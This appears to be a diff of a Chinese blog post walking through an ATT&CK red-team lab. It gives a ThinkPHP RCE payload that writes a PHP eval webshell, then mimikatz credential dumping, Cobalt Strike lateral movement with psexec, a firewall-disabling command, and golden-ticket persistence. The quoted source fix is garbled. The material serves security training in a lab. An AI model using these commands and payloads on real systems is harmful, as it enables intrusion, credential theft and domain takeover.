+<p>ThinkPHP是一个轻量级PHP开发框架。该框架存在远程代码执行漏洞，可直接控制服务器。<br>漏洞危害<br>该漏洞可能导致攻击者在服务器端任意执行代码，进而控制整个服务器。</p>
+<p>解决方案<br>1、升级至最新版本：<a href="http://www.thinkphp.cn/down.html" target="_blank" rel="noopener">http://www.thinkphp.cn/down.html</a></p>
+<p>2、或者直接修改源码：</p>
+<p>将/ThinkPHP/Lib/Core/Dispatcher.class.php文件中的</p>
+<p>$res = preg_replace(‘@(w+)’.$depr.’([^’.$depr.’/]+)@e’, ‘$var[&#39;\1&#39;]=”\2”;’, implode($depr,$paths));</p>
+<p>修改为：</p>
+<p>$res = preg_replace(‘@(w+)’.$depr.’([^’.$depr.’/]+)@e’, ‘$var[&#39;\1&#39;]=”\2’;’, implode($depr,$paths));</p>
+<p>将preg_replace第二个参数中的双引号改为单引号，防止其中的php变量语法被解析执行。</p>
+<p>payload:</p>
+<p><a href="http://192.168.135.150/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1" target="_blank" rel="noopener">http://192.168.135.150/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</a></p>
+<p>写入shell</p>
+<p><a href="http://192.168.135.150/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo" target="_blank" rel="noopener">http://192.168.135.150/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo</a> ^&lt;?php @eval($_POST[“bypass”]);?^&gt;&gt;shell.php </p>
+<p>蚁剑进行连接</p>
+</blockquote>
+<p>也可以扫描下目录</p>
+<blockquote>
+<p>python3 dirsearch.py -u 192.168.135.150 -e *</p>
+<p>[10:40:55] 200 -    2KB - /add.php<br>[10:41:52] 200 -    1KB - /favicon.ico<br>[10:42:03] 200 -  931B  - /Index<br>[10:42:03] 200 -  931B  - /index<br>[10:42:03] 200 -  931B  - /index.html<br>[10:42:03] 200 -  931B  - /index.php<br>[10:42:03] 200 -  931B  - /INDEX.PHP<br>[10:42:03] 200 -  931B  - /index.PHP<br>[10:42:41] 200 -   24B  - /robots.txt          </p>
+</blockquote>
+<p>发现add.php</p>
+<p>用字典跑</p>
+<p>得到密码</p>
+<p>admins</p>
+<h3 id="进行内网信息探测"><a href="#进行内网信息探测" class="headerlink" title="进行内网信息探测"></a>进行内网信息探测</h3><p>上线cs</p>
+<blockquote>
+<p>ipconfig /all</p>
+<p>域控制器的域名是sun.com</p>
+</blockquote>
+<p>进行提权然后用mimikatz和hashdump抓取密码</p>
+<p>然后内网扫描存活主机 </p>
+<blockquote>
+<p>portscan 192.168.138.0/24 1-6000 arp 10</p>
+</blockquote>
+<p>发现192.168.138.138存活</p>
+<blockquote>
+<p>shell net group “domain controllers” /domain 查看域控制器名称</p>
+<p>DC</p>
+</blockquote>
+<p>得到域控的ip</p>
+<blockquote>
+<p>ping DC.sun.com</p>
+<p>确认192.168.138.138是域控制器</p>
+</blockquote>
+<p>进行psexec传递</p>
+<p>因为内网不出网</p>
+<p>所以先监听192.168.138.136 smb</p>
+<p>创建smb通道</p>
+<p>右键spawn smb</p>
+<p>然后进行psexec传递</p>
+<p>但是win7开启了防火墙,监听不了</p>
+<p>关闭防火墙</p>
+<blockquote>
+<p>shell netsh advfirewall set allprofiles state off</p>
+</blockquote>
+<p>得到域控</p>
+<p><img src="/2020/09/06/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/%E5%AE%9E%E6%88%98%E4%BA%94.png" alt></p>
+<p> 持久控制</p>
+<p>黄金票据</p>
+<p>hashdump</p>
+<p>得到krbtgt的hash</p>
+<p>mimikatz获得sid</p>
+<p>接下来在普通域成员机器上制作黄金票据并导入</p>
+<p>导入之前无法访问域控的共享文件</p>
+<p> <strong>生成黄金票据并导入</strong> </p>
+<p><img src="/2020/09/06/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE.png" alt></p>
 
     </div>
 
@@ -573,7 +920,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ATT-amp-CK红队评估实战靶场-一"><span class="nav-number">1.</span> <span class="nav-text">ATT&amp;CK红队评估实战靶场(一)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#部署TeamServer"><span class="nav-number">1.1.</span> <span class="nav-text">部署TeamServer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#部署CobaltStrike"><span class="nav-number">1.2.</span> <span class="nav-text">部署CobaltStrike</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#目标机出网"><span class="nav-number">1.3.</span> <span class="nav-text">目标机出网</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#目标机不出网"><span class="nav-number">1.4.</span> <span class="nav-text">目标机不出网</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ATT-amp-CK红队评估实战靶场-二"><span class="nav-number">2.</span> <span class="nav-text">ATT&amp;CK红队评估实战靶场(二)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#域控信息收集"><span class="nav-number">2.0.1.</span> <span class="nav-text">域控信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#黄金票据利用"><span class="nav-number">2.0.2.</span> <span class="nav-text">黄金票据利用</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ATT-amp-CK红队评估实战靶场-一"><span class="nav-number">1.</span> <span class="nav-text">ATT&amp;CK红队评估实战靶场(一)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#部署TeamServer"><span class="nav-number">1.1.</span> <span class="nav-text">部署TeamServer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#部署CobaltStrike"><span class="nav-number">1.2.</span> <span class="nav-text">部署CobaltStrike</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#目标机出网"><span class="nav-number">1.3.</span> <span class="nav-text">目标机出网</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#目标机不出网"><span class="nav-number">1.4.</span> <span class="nav-text">目标机不出网</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ATT-amp-CK红队评估实战靶场-二"><span class="nav-number">2.</span> <span class="nav-text">ATT&amp;CK红队评估实战靶场(二)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#域控信息收集"><span class="nav-number">2.0.1.</span> <span class="nav-text">域控信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#黄金票据利用"><span class="nav-number">2.0.2.</span> <span class="nav-text">黄金票据利用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ATT-amp-CK红队评估实战靶场-三"><span class="nav-number">3.</span> <span class="nav-text">ATT&amp;CK红队评估实战靶场(三)</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#漏洞范围："><span class="nav-number">3.0.0.0.0.1.</span> <span class="nav-text">漏洞范围：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#危害："><span class="nav-number">3.0.0.0.0.2.</span> <span class="nav-text">危害：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#简要分析："><span class="nav-number">3.0.0.0.0.3.</span> <span class="nav-text">简要分析：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内网信息搜集"><span class="nav-number">3.0.1.</span> <span class="nav-text">内网信息搜集</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ATT-amp-CK红队评估实战靶场-四"><span class="nav-number">4.</span> <span class="nav-text">ATT&amp;CK红队评估实战靶场(四)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞原理"><span class="nav-number">4.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式"><span class="nav-number">4.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#影响版本"><span class="nav-number">4.3.</span> <span class="nav-text">影响版本</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第一种"><span class="nav-number">4.3.1.</span> <span class="nav-text">第一种</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二种"><span class="nav-number">4.3.2.</span> <span class="nav-text">第二种</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ATT-amp-CK红队评估实战靶场-五"><span class="nav-number">5.</span> <span class="nav-text">ATT&amp;CK红队评估实战靶场(五)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#进行内网信息探测"><span class="nav-number">5.0.1.</span> <span class="nav-text">进行内网信息探测</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -646,7 +993,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共31k字</span>
+  <span class="post-count">博客全站共35k字</span>
 </div>
 <br>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.0.0
